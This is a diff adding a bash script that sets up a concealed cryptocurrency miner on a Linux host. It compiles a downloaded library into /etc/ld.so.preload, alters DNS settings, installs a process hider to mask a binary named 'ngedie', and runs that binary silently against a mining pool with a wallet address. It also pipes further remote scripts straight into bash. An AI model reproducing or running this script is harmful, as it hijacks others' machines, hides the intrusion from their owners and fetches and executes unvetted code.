@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranbotak.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libontranbotak.so ontranbotak.c -ldl
+mv libontranbotak.so /usr/local/lib/
+echo /usr/local/lib/libontranbotak.so >> /etc/ld.so.preload
+rm ontranbotak.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ngedie"
+wget https://gitlab.com/ontranontran/kaspo/-/raw/main/ngedie >/dev/null 2>&1
+chmod +x ngedie
+./ngedie -c stratum+tcp://77.237.240.172:443#xnsub -u RWLcjcLuJhwAKM3ndbrUJ17XosqjMGL7PW.NGEDIE >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/ulukinahmad/botakkolor/main/kolorbot | bash
